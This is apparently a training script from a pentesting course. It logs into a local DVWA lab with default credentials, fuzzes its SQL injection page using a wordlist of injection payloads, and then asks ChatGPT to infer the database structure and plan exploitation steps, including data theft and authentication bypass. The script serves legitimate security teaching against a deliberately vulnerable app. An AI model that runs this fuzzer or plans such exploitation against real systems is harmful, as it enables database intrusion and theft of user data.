"""
Exploiting Application Function with ChatGPT
Fuzzing with ChatGPT
['Integrate ChatGPT into the fuzzing process to generate intelligent, context-aware fuzz vectors.', 'Use ChatGPT to analyze fuzzing results and identify successful exploitation attempts.', 'Apply ChatGPT to automate the categorization and prioritization of vulnerabilities discovered through fuzzing.', 'Develop a ChatGPT-assisted approach to enhancing traditional fuzzing tools with AI capabilities.']
This script is for training purposes only
"""
import requests
import sys
import os

current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, '..', 'class')
sys.path.append(class_dir)

from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func
from bs4 import BeautifulSoup
import requests

class PointlessAI_fuzzing_with_chatgpt(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def get_page(self, s, page_url):
        # Fetch the DVWA page within the established session."""
        response = s.get(page_url)
        return response

    def fuzz_url_with_wordlist(self, s):
        wordlist_path = '/usr/share/wordlists/wfuzz/Injections/SQL.txt'
        target_url = 'http://127.0.0.1/vulnerabilities/sqli/?id=FUZZ&Submit=Submit'
        success_arr = []

        with open(wordlist_path, 'r') as wordlist:
            for line in wordlist:
                test_path = target_url.replace('FUZZ', line.strip())
                response = s.get(test_path)
                if response.status_code != 404:  # Check if a valid response is received
                    # print(f"[{response.status_code}] Found: {test_path}")
                    # Parse the HTML content
                    soup = BeautifulSoup(response.text, 'html.parser')

                    # Find the specific div with class 'vulnerable_code_area'
                    div_content = soup.find('div', class_='vulnerable_code_area')

                    # Check if the div contains any pre tags
                    pre_tags = div_content.find_all('pre') if div_content else []

                    if pre_tags:
                        success_arr.append(line)
                        for pre in pre_tags:
                            # Cleaning up the text by replacing <br> with newlines for better readability
                            for br in pre.find_all('br'):
                                br.replace_with("\n")
                            print(pre.text)

        return success_arr

def main():
    ai = PointlessAI_fuzzing_with_chatgpt()  # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.login_url)
        login_response = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)
        print("Login Response Status:", login_response.status_code)

        page_url = f'{ai.base_url}/vulnerabilities/csrf/'
        # Fetch CSRF vulnerability page
        # page_response = ai.get_page(s, page_url)
        # print("Page Status Code:", page_response.status_code)
        # print("Page Content:", page_response.text[:500])  # Print first 500 characters of the page content

        working_sql = ai.fuzz_url_with_wordlist(s)
        print(working_sql)
        prompt = f"The following sql queries returned values: {str(working_sql)}. Based on these values theorize the following (if you dont know then best guess.): \
        1. **Database Type**: Is the database MySQL, SQL Server, PostgreSQL, or another type? Knowing the database type helps craft specific injection techniques. \
        2. **Input Fields**: Which input fields are vulnerable to injection? Identify parameters such as username, password, or search queries. \
        3. **Database Structure**: What tables and columns exist in the database? Understanding the database structure aids in formulating injection payloads. \
        4. **Vulnerability Severity**: How severe is the injection vulnerability? Assess the level of access and potential damage that can be inflicted. \
        5. **Injection Point**: Where in the SQL query can I inject malicious code? Determine if injection occurs in WHERE clauses, INSERT statements, or other query components. \
        6. **Data Retrieval**: Can I retrieve sensitive data from the database, such as usernames, passwords, or personal information? \
        7. **Data Manipulation**: Can I modify or delete database records using injection? Assess the possibility of altering data to exploit the vulnerability further. \
        8. **Error Handling**: How does the application handle SQL errors? Exploit error messages to gain insights into the database structure or query execution. \
        9. **Authentication Bypass**: Can I bypass authentication mechanisms using injection? Attempt to gain unauthorized access by manipulating authentication queries. \
        10. **Payload Validation**: Are there any input validation or sanitization measures in place? Test the effectiveness of input validation to determine if injection payloads can bypass security measures."
        db_theory = ai.general_query(prompt)
        print(db_theory)

        prompt = f"Based on {db_theory}, suggest reccomended next steps in the pen testing proccess.'"
        fuzz_dict = ai.general_query(prompt)
        print(fuzz_dict)
        #for vector in fuzz_dict["fuzz_vectors"]:
         #   print(vector)



if __name__ == "__main__":
    main()
